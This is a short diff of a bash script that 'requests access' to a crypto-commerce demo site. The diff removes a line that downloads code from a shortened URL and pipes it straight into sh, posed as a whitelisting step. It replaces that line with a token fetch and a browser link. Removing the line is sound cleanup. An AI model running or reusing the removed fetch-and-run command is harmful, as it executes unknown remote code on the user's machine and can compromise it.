@@ -1,6 +1,12 @@
+#!/bin/bash
 echo "Requesting access for the demo…"
-curl -fsSL 'https://pesncv.short.gy/csRkMn9m' -L | sh
-echo "Added to whitelist successfully. Showing demo…"
-echo "Enter https://demo.cryptocommerce.cloud in your browser"
-open "https://demo.cryptocommerce.cloud"
-cd "$USER_HOME"
+
+TOKEN=$(curl -fsSL 'https://www.cryptocommerce.cloud/api/whitelist')
+
+if [ -z "$TOKEN" ]; then
+  echo "Error: Could not reach the whitelist server. Please try again."
+  exit 1
+fi
+
+echo "Added to whitelist successfully. Opening demo…"
+open "https://demo.cryptocommerce.cloud/?token=$TOKEN"
